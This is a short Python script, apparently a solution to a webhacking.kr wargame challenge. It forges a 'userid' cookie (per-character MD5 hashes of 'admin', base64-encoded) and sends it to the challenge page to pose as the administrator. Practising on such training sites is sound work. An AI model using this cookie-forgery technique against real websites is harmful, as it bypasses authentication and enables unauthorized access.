import hashlib
import base64

import requests
from phpsessid import cookies

asdf = ''
for i in 'admin':
    asdf += hashlib.md5(i.encode()).hexdigest()

cookies['userid'] = base64.b64encode(asdf.encode()).decode()
url = 'https://webhacking.kr/challenge/js-6/index.php'
response = requests.get(url, cookies=cookies)
print(response.text)

